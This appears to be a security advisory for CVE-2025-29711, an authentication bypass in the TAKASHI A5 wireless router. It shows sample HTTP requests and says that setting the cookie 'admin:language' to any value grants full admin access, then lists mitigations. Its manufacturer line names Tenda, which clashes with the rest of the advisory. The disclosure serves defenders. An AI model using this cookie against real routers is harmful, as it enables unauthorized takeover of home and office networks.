# TAKASHI Wireless Instant Router and Repeater - Incorrect Access Control CVE-2025-29711

## Overview
A critical authentication bypass vulnerability has been identified in the TAKASHI Wireless Instant Router and Repeater (Model A5) running firmware version **V5.07.38_AAL03** with hardware version **V3.0**. This vulnerability allows unauthorized users to gain administrative access due to improper session management.

## Affected Model
- **Model**: A5
- **Manufacturer**: Tenda 
- **Software Version**: V5.07.38_AAL03  
- **Hardware Version**: V3.0  

## Vulnerability Details
Improper session management in Takashi Wireless Instant Router and
Repeater (Model A5) firmware v5.07.38_AAL03 with hardware v3.0 allows
unauthorized attackers to gain admin-level access via a crafted
request.
## Request Comparison
To understand how this vulnerability works, let's compare an unauthenticated request to an authenticated request.

### Unauthenticated Request
```
POST /LoginCheck HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.2.1/login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.2.1
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Username=admin&checkEn=0&Password=whatsthepassword
```

### Authenticated Request
```
GET /wireless_basic.asp HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.2.1/advance.asp
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: language=en; admin:language=en
Upgrade-Insecure-Requests: 1
Priority: u=4
```

## Key Difference
The key difference between the two requests is the presence of the following cookie:
```
admin:language=en
```

## The Vulnerability
The application trusts the `admin:language` cookie without properly verifying session authentication. By simply adding this cookie with an arbitrary value, an unauthenticated user can gain full administrative access.

### Exploit Mechanics
An attacker can exploit this vulnerability by setting the following cookie:
```
admin:language=<any_value>
```
Where `<any_value>` can be any string, text, or number. As long as the cookie is present, the application will treat the user as an authenticated admin.

## Impact
- Unauthorized users can gain admin-level access without valid credentials.
- Attackers can modify router settings, expose sensitive data, and potentially disrupt network operations.
- No brute-force or credential stuffing is needed—just cookie manipulation.

## Mitigation
To mitigate this issue, the following steps should be taken:
1. **Proper Session Management**: Implement server-side session validation instead of relying on client-side cookies.
2. **Token-Based Authentication**: Use secure session tokens that cannot be forged.
3. **Session Expiry**: Ensure sessions expire and require re-authentication after a set period.
4. **Cookie Integrity Checks**: Validate cookies against an active session in the backend database.


## References
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [GoAhead Web Server](https://www.embedthis.com/goahead/)

## Disclaimer
This vulnerability report is for educational and research purposes only. The information provided should not be used for malicious activities. Always obtain proper authorization before testing security vulnerabilities on any system.

---

**Contributors**  
- William James Schleppegrell


